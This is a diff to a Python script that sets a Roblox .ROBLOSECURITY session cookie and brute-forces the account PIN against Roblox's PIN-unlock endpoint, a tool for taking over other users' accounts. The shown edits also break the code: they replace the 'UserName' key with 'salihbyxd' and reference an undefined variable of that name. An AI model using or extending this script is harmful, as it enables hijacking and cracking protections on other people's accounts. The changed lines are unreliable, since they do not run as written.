@@ -12,7 +12,7 @@ os.system('cls')
 req = requests.Session()
 req.cookies['.ROBLOSECURITY'] = cookie
 try:
-    username = req.get('https://www.roblox.com/mobileapi/userinfo').json()['UserName']
+    username = req.get('https://www.roblox.com/mobileapi/userinfo').json()['salihbyxd']
     print('Logged in to', username)
 except:
     input('INVALID COOKIE')
@@ -37,7 +37,7 @@ print(f'Prioritized likely pins {likely}\n')
 tried = 0
 while 1:
     pin = pins.pop(0)
-    os.system(f'title Pin Cracking {username} ~ Tried: {tried} ~ Current pin: {pin}')
+    os.system(f'title Pin Cracking {salihbyxd} ~ Tried: {tried} ~ Current pin: {pin}')
     try:
         r = req.post('https://auth.roblox.com/v1/account/pin/unlock', json={'pin': pin})
         if 'X-CSRF-TOKEN' in r.headers:
